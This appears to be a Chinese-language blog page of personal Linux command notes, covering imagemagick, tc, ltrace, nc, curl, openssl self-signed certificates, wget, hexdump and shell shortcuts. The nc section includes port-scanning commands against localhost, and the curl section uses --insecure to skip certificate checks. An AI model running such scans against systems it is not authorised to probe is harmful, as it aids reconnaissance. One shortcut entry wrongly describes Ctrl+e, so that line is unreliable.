<h2 id="21-图片操作工具-imagemagick"><a href="#21-图片操作工具-imagemagick" class="headerlink" title="21. 图片操作工具 imagemagick"></a>21. 图片操作工具 imagemagick</h2><h3 id="21-1-图片转pdf"><a href="#21-1-图片转pdf" class="headerlink" title="21.1. 图片转pdf"></a>21.1. 图片转pdf</h3><ul>
<li>按照图片名字顺序生成pdf</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">convert *.jpg +compress foo.pdf</span><br></pre></td></tr></table></figure>

<h3 id="21-2-pdf转图片"><a href="#21-2-pdf转图片" class="headerlink" title="21.2. pdf转图片"></a>21.2. pdf转图片</h3><ul>
<li>执行了下面命令后，就会生成 image_name-0.jpg，image_name-1.jpg等等图片，数目由PDF页数决定。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">convert pdf_name.pdf image_name.jpg</span><br></pre></td></tr></table></figure>

<p><strong>额外的参数</strong></p>
<ul>
<li><code>-resize 1800x</code>: 指定生成的像素大小，越大生成的图片越大，转化的时间越久</li>
<li><code>-density 150</code>: 参数指定密度，具体含义再查</li>
<li><code>-quality 100</code>: 指定生成图片的质量</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">convert -resize 1800x -density 150 -quality 100 pdf_name.pdf image_name.jpg</span><br></pre></td></tr></table></figure>

<h3 id="21-3-gif和图片转换"><a href="#21-3-gif和图片转换" class="headerlink" title="21.3. gif和图片转换"></a>21.3. gif和图片转换</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gif转jpg</span></span><br><span class="line">=&gt; convert test.gif test.jpg</span><br><span class="line">=&gt; ls</span><br><span class="line">test-0.jpg   test-11.jpg  test-13.jpg  test-15.jpg  test-17.jpg  test-2.jpg  test-4.jpg  test-6.jpg  test-8.jpg  test.gif</span><br><span class="line">test-10.jpg  test-12.jpg  test-14.jpg  test-16.jpg  test-1.jpg   test-3.jpg  test-5.jpg  test-7.jpg  test-9.jpg</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">jpg转gif</span></span><br><span class="line">=&gt; convert test-*.jpg aaa.gif</span><br></pre></td></tr></table></figure>

<h3 id="21-4-图片信息查看"><a href="#21-4-图片信息查看" class="headerlink" title="21.4. 图片信息查看"></a>21.4. 图片信息查看</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; identify -verbose misc2.jpg</span><br><span class="line">Image:</span><br><span class="line">  Filename: misc2.jpg</span><br><span class="line">  Permissions: rw-r--r--</span><br><span class="line">  Format: JPEG (Joint Photographic Experts Group JFIF format)</span><br><span class="line">  Mime type: image/jpeg</span><br><span class="line">  Class: DirectClass</span><br><span class="line">  Geometry: 1366x768+0+0</span><br><span class="line">  Resolution: 96x96</span><br><span class="line">  Print size: 14.2292x8</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="22-模拟网络延迟-tc"><a href="#22-模拟网络延迟-tc" class="headerlink" title="22. 模拟网络延迟 tc"></a>22. 模拟网络延迟 tc</h2><ul>
<li>局限就是只能对某一个网卡设置，不能设定规则来指针对ip和端口</li>
</ul>
<h3 id="22-1-基本操作"><a href="#22-1-基本操作" class="headerlink" title="22.1. 基本操作"></a>22.1. 基本操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 增加延迟 ##########</span></span></span><br><span class="line">tc qdisc add dev eth0 root netem delay 100ms</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 删除规则 ##########</span></span></span><br><span class="line">tc qdisc del dev eth0 root</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 查询规则 ##########</span></span></span><br><span class="line">tc -s qdisc ls dev eth0</span><br></pre></td></tr></table></figure>

<h2 id="23-ltrace-跟踪库函数调用"><a href="#23-ltrace-跟踪库函数调用" class="headerlink" title="23. ltrace 跟踪库函数调用"></a>23. ltrace 跟踪库函数调用</h2><h3 id="23-1-选项"><a href="#23-1-选项" class="headerlink" title="23.1 选项"></a>23.1 选项</h3><ul>
<li><code>-r</code>: 显示运行时间，<code>0.000123</code></li>
<li><code>-t</code>: 和<code>-r</code>不能同时用，显示当前时间，<code>23:12:11</code></li>
<li><code>-tt</code>: 和<code>-r</code>不能同时用，显示当前时间，<code>23:12:11.345678</code></li>
<li><code>-ttt</code>: 和<code>-r</code>不能同时用，显示当前时间戳，<code>1645024757.123456</code></li>
<li><code>-T</code>: 显示调用花费的时间，在函数调用返回值后面用<code>&lt;&gt;</code>包裹</li>
<li><code>-i</code>: 显示函数的地址</li>
<li><code>-c</code>: 显示统计数据，表格形式</li>
<li><code>-S</code>: 将系统调用显示出来，使用<code>SYS_</code>作为前缀</li>
<li><code>-p [PID]</code>: 挂载到一个进程</li>
</ul>
<h3 id="23-2-实例"><a href="#23-2-实例" class="headerlink" title="23.2 实例"></a>23.2 实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听一段时间的5623的函数调用次数，需要ctrl c停止监听后才显示结果</span></span><br><span class="line">=&gt; ltrace -p 5623 -c</span><br><span class="line">^C% time     seconds  usecs/call     calls      function</span><br><span class="line">------ ----------- ----------- --------- --------------------</span><br><span class="line"> 36.20    0.151489        2913        52 __errno_location</span><br><span class="line"> 29.99    0.125516        5229        24 epoll_wait</span><br><span class="line"> 24.01    0.100467        2954        34 clock_gettime</span><br><span class="line">  5.33    0.022294        2786         8 pthread_mutex_lock</span><br><span class="line">  4.47    0.018724        2340         8 pthread_mutex_unlock</span><br><span class="line">------ ----------- ----------- --------- --------------------</span><br><span class="line">100.00    0.418490                   126 total</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示系统调用并显示各个函数的调用耗时</span></span><br><span class="line">＝&gt; ltrace -t -S -T ./run</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">省略若干行</span></span><br><span class="line">...</span><br><span class="line">23:36:12 _ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev(0x5714c8aed8, 0, 0, 0x5714c79010) = 0x5714c8aee8 &lt;0.001116&gt;</span><br><span class="line">23:36:12 _ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev(0x5714c8aeb8, 0x5714c8aee8, 0, 0x5714c79010) = 0x7abb140060 &lt;0.001756&gt;</span><br><span class="line">23:36:12 _ZdlPvm(0x5714c8aeb0, 224, 0, 0x5714c79010)                 = 0x7abb140060 &lt;0.001005&gt;</span><br><span class="line">23:36:12 _ZdlPvm(0x5714c8b110, 720, 1, 0x7fe51ecda0)                 = 0x7abb140060 &lt;0.000966&gt;</span><br><span class="line">23:36:12 _ZdlPvm(0x5714c8b740, 16, 1, 0x5714c8b740)                  = 0x7abb140060 &lt;0.000864&gt;</span><br><span class="line">23:36:12 _ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev(0x5714c8b668, 0, 0, 0x5714c79010) = 0x5714c8b678 &lt;0.001675&gt;</span><br><span class="line">23:36:12 _ZdlPvm(0x5714c8b650, 232, 1, 0x7fe51ecfc0)                 = 0x7abb140060 &lt;0.000936&gt;</span><br><span class="line">23:36:12 _ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev(0x5714c8b768, 0, 0, 0x5714c79010) = 0x5714c8b778 &lt;0.000870&gt;</span><br><span class="line">23:36:12 _ZdlPvm(0x5714c8b760, 64, 1, 0x5714c79010)                  = 0x7abb140060 &lt;0.000934&gt;</span><br><span class="line">23:36:12 memset(0x5714c8b7b0, &#x27;\0&#x27;, 104)                             = 0x5714c8b7b0 &lt;0.001023&gt;</span><br><span class="line">23:36:12 _ZdlPvm(0x5714c8b7b0, 104, 13, 0x5714c8b7e0)                = 0x7abb140060 &lt;0.000877&gt;</span><br><span class="line">23:36:12 SYS_exit_group(0 &lt;no return ...&gt;</span><br><span class="line">23:36:12 +++ exited (status 0) +++</span><br></pre></td></tr></table></figure>

<h2 id="24-dmidecode-获取硬件信息"><a href="#24-dmidecode-获取硬件信息" class="headerlink" title="24. dmidecode 获取硬件信息"></a>24. dmidecode 获取硬件信息</h2><h3 id="24-1-获取内存信息"><a href="#24-1-获取内存信息" class="headerlink" title="24.1. 获取内存信息"></a>24.1. 获取内存信息</h3><ul>
<li>可以获取到有几个插槽，每个插槽内存信息（包括频率、大小、电压、类型等）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; sudo dmidecode -t memory</span><br></pre></td></tr></table></figure>

<h2 id="25-nc-网络链接工具"><a href="#25-nc-网络链接工具" class="headerlink" title="25. nc 网络链接工具"></a>25. nc 网络链接工具</h2><h3 id="25-1-选项详解"><a href="#25-1-选项详解" class="headerlink" title="25.1. 选项详解"></a>25.1. 选项详解</h3><ul>
<li><code>-l</code>: 监听</li>
<li><code>-p [port]</code>: 本地端口，监听状态就绑定这个端口，非监听状态就是使用此端口发送</li>
<li><code>-v</code>: 显示输出，会打印一些连接过程和错误信息</li>
<li><code>-u</code>: udp模式，默认是tcp</li>
<li><code>-n</code>: 不翻译ip到hostname</li>
<li><code>-s</code>: 监听地址，默认监听所有地址</li>
<li><code>-w [second]</code>: 连接超时时间，单位秒</li>
<li><code>-z</code>: 测试模式，用于扫描，连接成功就断开，加上<code>-v</code>会显示结果</li>
</ul>
<h3 id="25-2-基本用法"><a href="#25-2-基本用法" class="headerlink" title="25.2. 基本用法"></a>25.2. 基本用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### tcp ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听0.0.0.0:1234，只处理一个连接，客户端连上后关闭就退出</span></span><br><span class="line">nc -l -p 1234</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试监听的端口</span></span><br><span class="line">nc -vz 127.0.0.1 1234</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫描ip是否有端口开放，无超时时间，如果服务端不给回包就一直发</span></span><br><span class="line">nc -vz 127.0.0.1 1-1024</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫描ip是否有端口开放，每个连接超时1s</span></span><br><span class="line">nc -vz -w 1 127.0.0.1 1-1024</span><br></pre></td></tr></table></figure>

<h2 id="26-curl-网络请求工具"><a href="#26-curl-网络请求工具" class="headerlink" title="26. curl 网络请求工具"></a>26. curl 网络请求工具</h2><p>参考: <a href="https://blog.csdn.net/angle_chen123/article/details/120675472">https://blog.csdn.net/angle_chen123/article/details/120675472</a></p>
<h3 id="26-1-选项解释"><a href="#26-1-选项解释" class="headerlink" title="26.1. 选项解释"></a>26.1. 选项解释</h3><ul>
<li><code>-X [proto]</code>: 指定协议，可选<code>POST/GET/HEAD/DELETE/PUT/PATCH</code>，默认是GET</li>
<li><code>-H &quot;[name]: [value]&quot;</code>: 添加一个header头，示例<code>-H &quot;Content-Type: application/json&quot;</code></li>
<li><code>-d @file</code>: 文件内容为post内容</li>
<li><code>-d &quot;string&quot;</code>: 内容为post的body内容，指定了<code>-d</code>会默认使用POST</li>
<li><code>-F &quot;name=@file&quot;</code>: 表单形式提交文件，会自动设置<code>Content-Type: multipart/form-data</code>，示例<code>-F &quot;page=@/tmp/a;filename=a.txt&quot;</code></li>
<li><code>--insecure</code>: 允许不授信的证书</li>
<li><code>-o [filename]</code>: 输出储存到文件</li>
<li><code>-c [filename]</code>: 将返回的cookie保存到文件</li>
<li><code>-b [filename]</code>: 将文件内容作为cookie发送</li>
<li><code>-b &#39;name=value; name=value&#39;</code>: 设置cookie</li>
<li><code>-x &quot;127.0.0.1:1080&quot;</code>: 使用代理访问</li>
</ul>
<p><strong>POST默认的头部数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api HTTP/1.1</span><br><span class="line">Host: 10.240.17.101</span><br><span class="line">User-Agent: curl/7.86.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 7</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p><strong>GET默认头部数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api HTTP/1.1</span><br><span class="line">Host: 10.240.17.101</span><br><span class="line">User-Agent: curl/7.86.0</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>

<h3 id="26-1-几种常用的示例"><a href="#26-1-几种常用的示例" class="headerlink" title="26.1. 几种常用的示例"></a>26.1. 几种常用的示例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get请求下载文件</span></span><br><span class="line">curl http://1.1.1.1/download/aaa.txt -o aaa.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get发起请求，传参</span></span><br><span class="line">curl http://1.1.1.1/api?a=1&amp;b=2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">post发起请求，传输x-www-form-urlencoded数据</span></span><br><span class="line">curl -X POST -d &#x27;a=1&amp;b=2&#x27; http://2.2.2.2/api</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">post发起请求，传输json数据</span></span><br><span class="line">curl -X POST -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;a&quot;:1,&quot;b&quot;:2&#125;&#x27; http://1.1.1.1/api</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">忽略证书错误的请求</span></span><br><span class="line">curl https://1.1.1.1/api --insecure</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传文件</span></span><br><span class="line">curl -X POST -F &#x27;file=@test.txt;filename=a.txt&#x27; http://10.240.17.101/api</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">储存cookie到文件，下次请求携带过去</span></span><br><span class="line">curl -X GET http://10.240.17.101/api -c cookie.txt</span><br><span class="line">curl -X GET http://10.240.17.101/api -b cookie.txt</span><br></pre></td></tr></table></figure>

<h2 id="27-clang"><a href="#27-clang" class="headerlink" title="27. clang"></a>27. clang</h2><h3 id="27-1-查看预定义宏"><a href="#27-1-查看预定义宏" class="headerlink" title="27.1. 查看预定义宏"></a>27.1. 查看预定义宏</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; clang -dM -E -x c /dev/null</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define _LP64 1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __ATOMIC_ACQUIRE 2</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __ATOMIC_ACQ_REL 4</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __ATOMIC_CONSUME 1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __ATOMIC_RELAXED 0</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="28-brctl-网桥管理命令"><a href="#28-brctl-网桥管理命令" class="headerlink" title="28. brctl 网桥管理命令"></a>28. brctl 网桥管理命令</h2><ul>
<li>命令创建的都只是临时生效，重启后就不生效了。想要持续生效需要参考对应的网络管理器的配置。</li>
<li>网桥绑定网卡后，就会接管此网卡，此网卡配置都可以清除，反正不生效。配置网桥即可</li>
</ul>
<h3 id="28-1-基本用法"><a href="#28-1-基本用法" class="headerlink" title="28.1. 基本用法"></a>28.1. 基本用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建网桥</span></span><br><span class="line">=&gt; sudo brctl addbr virbr0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置网桥的stp打开</span></span><br><span class="line">=&gt; sudo brctl stp virbr0 on</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置网桥绑定到一个网卡</span></span><br><span class="line">=&gt; sudo brctl addif virbr0 eno1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看网桥</span></span><br><span class="line">=&gt; sudo brctl show</span><br><span class="line">bridge name     bridge id               STP enabled     interfaces</span><br><span class="line">virbr0          8000.66c563b8e2bc       yes             eno1</span><br></pre></td></tr></table></figure>

<h2 id="29-sox-音频转换命令"><a href="#29-sox-音频转换命令" class="headerlink" title="29. sox 音频转换命令"></a>29. sox 音频转换命令</h2><h3 id="29-1-常用用法"><a href="#29-1-常用用法" class="headerlink" title="29.1. 常用用法"></a>29.1. 常用用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sox rec.au rec.wav</span><br></pre></td></tr></table></figure>

<h2 id="30-nslookup-解析域名"><a href="#30-nslookup-解析域名" class="headerlink" title="30. nslookup 解析域名"></a>30. nslookup 解析域名</h2><h3 id="30-1-选项"><a href="#30-1-选项" class="headerlink" title="30.1. 选项"></a>30.1. 选项</h3><ul>
<li><code>-q=A</code>: 查询A记录</li>
<li><code>-vc</code>: 使用tcp查询</li>
</ul>
<h2 id="31-wget"><a href="#31-wget" class="headerlink" title="31. wget"></a>31. wget</h2><h3 id="31-1-选项"><a href="#31-1-选项" class="headerlink" title="31.1. 选项"></a>31.1. 选项</h3><ul>
<li><code>-r</code>: 表示递归下载。</li>
<li><code>-np</code>: 表示不要进入父级目录。</li>
<li><code>-nH</code>: 表示不要在本地创建主机名目录。</li>
<li><code>--cut-dirs=2</code>: 表示从第二级目录开始下载。</li>
<li><code>-R index.html</code>: 表示不下载 index.html 文件。</li>
</ul>
<h3 id="31-2-示例"><a href="#31-2-示例" class="headerlink" title="31.2. 示例"></a>31.2. 示例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递归下载此链接下所有文件，不进入父级目录，下载完看到es5目录（前两级裁剪掉了）</span></span><br><span class="line">wget -r -np -nH --cut-dirs=2 -R index.html https://cdn.mathjax.org/mathjax/es5/</span><br></pre></td></tr></table></figure>

<h2 id="32-hexdump"><a href="#32-hexdump" class="headerlink" title="32. hexdump"></a>32. hexdump</h2><h3 id="32-1-选项"><a href="#32-1-选项" class="headerlink" title="32.1. 选项"></a>32.1. 选项</h3><ul>
<li><code>-C</code>: 显示ascii和hex对应的格式</li>
<li><code>-n &lt;length&gt;</code>: 指定显示几个字节</li>
</ul>
<h3 id="32-2-示例"><a href="#32-2-示例" class="headerlink" title="32.2. 示例"></a>32.2. 示例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; hexdump 隐藏的钥匙.jpg | head -n 3</span><br><span class="line">0000000 d8ff e0ff 1000 464a 4649 0100 0001 0100</span><br><span class="line">0000010 0100 0000 feff 3b00 5243 4145 4f54 3a52</span><br><span class="line">0000020 6720 2d64 706a 6765 7620 2e31 2030 7528</span><br><span class="line">=&gt; hexdump -C 隐藏的钥匙.jpg | head -n 3</span><br><span class="line">00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 00 00 01  |......JFIF......|</span><br><span class="line">00000010  00 01 00 00 ff fe 00 3b  43 52 45 41 54 4f 52 3a  |.......;CREATOR:|</span><br><span class="line">00000020  20 67 64 2d 6a 70 65 67  20 76 31 2e 30 20 28 75  | gd-jpeg v1.0 (u|</span><br><span class="line">=&gt; hexdump -C -n 100 隐藏的钥匙.jpg</span><br><span class="line">00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 00 00 01  |......JFIF......|</span><br><span class="line">00000010  00 01 00 00 ff fe 00 3b  43 52 45 41 54 4f 52 3a  |.......;CREATOR:|</span><br><span class="line">00000020  20 67 64 2d 6a 70 65 67  20 76 31 2e 30 20 28 75  | gd-jpeg v1.0 (u|</span><br><span class="line">00000030  73 69 6e 67 20 49 4a 47  20 4a 50 45 47 20 76 36  |sing IJG JPEG v6|</span><br><span class="line">00000040  32 29 2c 20 71 75 61 6c  69 74 79 20 3d 20 39 30  |2), quality = 90|</span><br><span class="line">00000050  0a ff db 00 43 00 03 02  02 03 02 02 03 03 03 03  |....C...........|</span><br><span class="line">00000060  04 03 03 04                                       |....|</span><br><span class="line">00000064</span><br></pre></td></tr></table></figure>

<h2 id="33-base64"><a href="#33-base64" class="headerlink" title="33. base64"></a>33. base64</h2><h3 id="33-1-选项"><a href="#33-1-选项" class="headerlink" title="33.1. 选项"></a>33.1. 选项</h3><ul>
<li><code>-d</code>: 解密</li>
</ul>
<h3 id="33-2-示例"><a href="#33-2-示例" class="headerlink" title="33.2. 示例"></a>33.2. 示例</h3><ul>
<li>base64一般是对文件，如果需要字符串则要使用管道</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解密</span></span><br><span class="line">=&gt; echo -n &quot;Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=&quot; | base64 -d</span><br><span class="line"><span class="meta prompt_">377cbadda1eca2f2f73d36277781f00a%</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 加密</span></span></span><br><span class="line">=&gt; echo -n &quot;377cbadda1eca2f2f73d36277781f00a&quot; | base64</span><br><span class="line">Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=</span><br></pre></td></tr></table></figure>

<h1 id="四、小技巧"><a href="#四、小技巧" class="headerlink" title="四、小技巧"></a>四、小技巧</h1><h2 id="1-swap临时空间（可用于编译时内存不足问题）"><a href="#1-swap临时空间（可用于编译时内存不足问题）" class="headerlink" title="1. swap临时空间（可用于编译时内存不足问题）"></a>1. swap临时空间（可用于编译时内存不足问题）</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看内存文件</span></span><br><span class="line">sudo swapon --show</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一般内存不够了，可以用这种方式增加交换内存。</span></span><br><span class="line">dd if=/dev/zero of=/var/swapfile1 bs=1024 count=6000000</span><br><span class="line">mkswap /var/swapfile1</span><br><span class="line">swapon /var/swapfile1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不需要交换内存的时候，取消磁盘占用</span></span><br><span class="line">swapoff /var/swapfile1</span><br><span class="line">rm -f /var/swapfile1</span><br></pre></td></tr></table></figure>

<h2 id="2-自颁发证书（不受信）"><a href="#2-自颁发证书（不受信）" class="headerlink" title="2. 自颁发证书（不受信）"></a>2. <span id="openssl_diy">自颁发证书（不受信）</span></h2><p>在开发过程中，https请求需要配置ssl证书，这个证书需要到部分供应商申请（阿里云、腾讯云等），自然不是免费的。开发过程中并不想这么麻烦，可以使用shell中的openssl进行自颁发证书。</p>
<ol>
<li>颁发证书需要先生成一个颁发机构，也就是CA</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建目录防止混乱</span></span><br><span class="line">mkdir -p ssl_diy/private &amp;&amp; cd ssl_diy</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成ca的私钥</span></span><br><span class="line">openssl genrsa -out private/cakey.pem 2048</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据key生成CA的证书文件</span></span><br><span class="line">openssl req -new -x509 -key private/cakey.pem -out cacert.pem</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将有一些配置需要填写，可以随意填写，因为是自颁发</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Country Name (2 letter code) [AU]: 国家名，自然CN</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">State or Province Name (full name) [Some-State]: 省份名称，比如Hunan</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Locality Name (eg, city) []: 城市名称，比如changsha</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Organization Name (eg, company) [Internet Widgits Pty Ltd]: 公司名称</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Organizational Unit Name (eg, section) []: 部门名称</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Common Name (eg, YOUR name) []: 颁发者的名字</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Email Address []: 邮件地址</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>生成证书</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">同样生成私钥key</span></span><br><span class="line">openssl genrsa -out domain.key 2048</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据key生成证书文件</span></span><br><span class="line">openssl req -new -key domain.key -out domain.csr</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将有一些配置需要填写，可以随意填写，因为是自颁发</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Country Name (2 letter code) [AU]: 国家名，自然CN</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">State or Province Name (full name) [Some-State]: 省份名称，比如Hunan</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Locality Name (eg, city) []: 城市名称，比如changsha</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Organization Name (eg, company) [Internet Widgits Pty Ltd]: 公司名称</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Organizational Unit Name (eg, section) []: 部门名称</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Common Name (eg, server FQDN or YOUR name) []: 填写网站的域名</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Email Address []: 邮件地址</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用ca给证书签名</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">签名前需要有几个准备文件</span></span><br><span class="line">mkdir -p demoCA/newcerts</span><br><span class="line">touch demoCA/index.txt</span><br><span class="line">echo 01 &gt; demoCA/serial</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">签名，可以自定义有效天数-days</span></span><br><span class="line">openssl ca -in domain.csr -cert cacert.pem -keyfile private/cakey.pem -days 365 -out domain.crt</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>将生成的domain.crt和domain.key配置到服务器即可</li>
</ol>
<h2 id="3-快捷键"><a href="#3-快捷键" class="headerlink" title="3. 快捷键"></a>3. 快捷键</h2><ul>
<li><code>Ctrl + a</code> &#x2F; <code>home</code>: 移到行首</li>
<li><code>Ctrl + e</code> &#x2F; <code>end</code>: 移到行首</li>
<li><code>Ctrl + r</code>: 历史命令搜索，不支持模糊搜索，只支持连续字符</li>
<li><code>Ctrl + k</code>: 清空光标后面的字符</li>
<li><code>Ctrl + u</code>: 清空光标前面的字符</li>
</ul>
<h2 id="4-安装软件"><a href="#4-安装软件" class="headerlink" title="4. 安装软件"></a>4. 安装软件</h2><h3 id="4-1-二进制安装"><a href="#4-1-二进制安装" class="headerlink" title="4.1. 二进制安装"></a>4.1. 二进制安装</h3><ul>
<li>一般二进制都会自带依赖，可以直接使用</li>
<li>linux根目录有一个opt目录，大致是让用户自定义软件放在这里</li>
<li>&#x2F;usr&#x2F;local&#x2F;bin目录下放的是用户自定义应用，所以移过去后可以软链过去</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mv xxx /opt/xxx</span><br><span class="line">sudo ln -s /opt/xxx/bin/xxx /usr/local/bin/xxx</span><br></pre></td></tr></table></figure>

<h2 id="5-代码扫描"><a href="#5-代码扫描" class="headerlink" title="5. 代码扫描"></a>5. 代码扫描</h2><ul>
<li>github搜索shellcheck软件，根据系统安装</li>
<li>vscode搜索shellcheck插件，安装</li>
<li>不在PATH中则手动配置路径即可完成扫描</li>
</ul>
<h2 id="6-软件运行"><a href="#6-软件运行" class="headerlink" title="6. 软件运行"></a>6. 软件运行</h2><h3 id="6-1-临时加载库so"><a href="#6-1-临时加载库so" class="headerlink" title="6.1. 临时加载库so"></a>6.1. 临时加载库so</h3><ul>
<li>只想要当前运行加载so，可以执行下面命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=&quot;xxx&quot;</span><br></pre></td></tr></table></figure>

<h2 id="7-脚本技巧"><a href="#7-脚本技巧" class="headerlink" title="7. 脚本技巧"></a>7. 脚本技巧</h2><h3 id="7-1-获取脚本所在目录"><a href="#7-1-获取脚本所在目录" class="headerlink" title="7.1. 获取脚本所在目录"></a>7.1. 获取脚本所在目录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="variable">$0</span>是脚本目录，<span class="built_in">dirname</span>获取目录</span></span><br><span class="line">scriptDir=&quot;$(dirname &quot;$0&quot;)&quot;</span><br></pre></td></tr></table></figure>

<h2 id="8-有用的软件"><a href="#8-有用的软件" class="headerlink" title="8. 有用的软件"></a>8. 有用的软件</h2><h3 id="8-1-登陆显示系统信息"><a href="#8-1-登陆显示系统信息" class="headerlink" title="8.1. 登陆显示系统信息"></a>8.1. 登陆显示系统信息</h3><p>安装<code>landscape-common</code>，可以在登陆时显示下面的信息</p>
